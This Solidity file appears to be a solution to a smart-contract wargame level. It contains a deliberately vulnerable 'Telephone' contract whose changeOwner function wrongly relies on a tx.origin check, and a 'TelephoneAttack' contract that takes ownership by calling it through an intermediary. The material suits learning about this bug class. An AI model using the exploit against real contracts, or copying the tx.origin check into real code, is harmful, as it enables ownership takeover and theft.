// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneAttack {
    Telephone toAttack;

    constructor(address _levelInstance) public {
        toAttack = Telephone(_levelInstance);
    }

    function attack() public {
        toAttack.changeOwner(msg.sender);
    }
}